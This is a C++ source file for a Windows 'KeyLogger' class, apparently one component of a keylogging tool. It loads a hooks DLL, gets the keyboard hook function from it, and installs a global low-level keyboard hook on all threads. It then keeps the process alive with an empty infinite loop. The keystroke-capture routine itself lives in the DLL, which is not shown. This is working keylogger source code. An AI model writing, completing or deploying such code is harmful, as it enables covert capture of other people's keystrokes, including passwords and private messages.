#include "pch.h"
#include "KeyLogger.hpp"


KeyLogger::KeyLogger() : 
	keyboard_hook(create_hook())
{
}

KeyLogger::~KeyLogger()
{
	try
	{
		if (!UnhookWindowsHookEx(keyboard_hook))
		{
			throw WindowsException();
		}

		Logger::Instance().info(L"Unregistered keyboard hook");
	}
	catch (const WindowsException& e)
	{
		std::wcout << e.what() << std::endl;
	}
	catch (...)
	{
		OutputDebugStringW(L"Failed to release hook");
	}
}

void KeyLogger::start()
{
	static KeyLogger key_logger{};

	for (;;)
	{
	}
}

HHOOK KeyLogger::create_hook()
{
	Logger::Instance().info(L"Registering keyboard hook");

	HOOKPROC hkprcSysMsg;
	static HINSTANCE hinstDLL;
	static HHOOK hhookSysMsg;

	hinstDLL = LoadLibraryA(SystemUtils::HOOKS_DLL_PATH);
	if (!hinstDLL)
	{
		throw WindowsException();
	}

	hkprcSysMsg = (HOOKPROC)GetProcAddress(hinstDLL, KEYBOARD_HOOK_FUNCTION);
	if (!hkprcSysMsg)
	{
		throw WindowsException();
	}

	HHOOK keyboardHook = SetWindowsHookExW(
							WH_KEYBOARD_LL,
							hkprcSysMsg,
							hinstDLL,
							0);

	if (!keyboardHook)
	{
		throw WindowsException();
	}

	return keyboardHook;
}